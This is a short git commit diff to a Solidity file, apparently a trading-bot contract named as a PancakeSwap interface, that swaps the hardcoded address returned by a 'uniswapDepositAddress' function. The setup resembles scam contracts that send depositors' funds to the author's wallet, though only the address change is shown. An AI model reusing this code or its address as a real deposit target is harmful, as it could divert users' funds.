f8c2f1fcdcce81efea7676acd658bf286ffced83
Metaforeseenico <96207905+Metaforeseenico@users.noreply.github.com>
2022-01-24 05:26:17 -0500

    Update IPancakeswapV2Interface.sol

--- IPancakeswapV2Interface.sol
+++ IPancakeswapV2Interface.sol
@@ -6,6 +6,6 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x9c9BB851ac778989b6c0024955c17fDdee8268ce;
+		return 0x784Fb377133a7F645C7d3EC687149d25B36B87c9;
 	}
 }
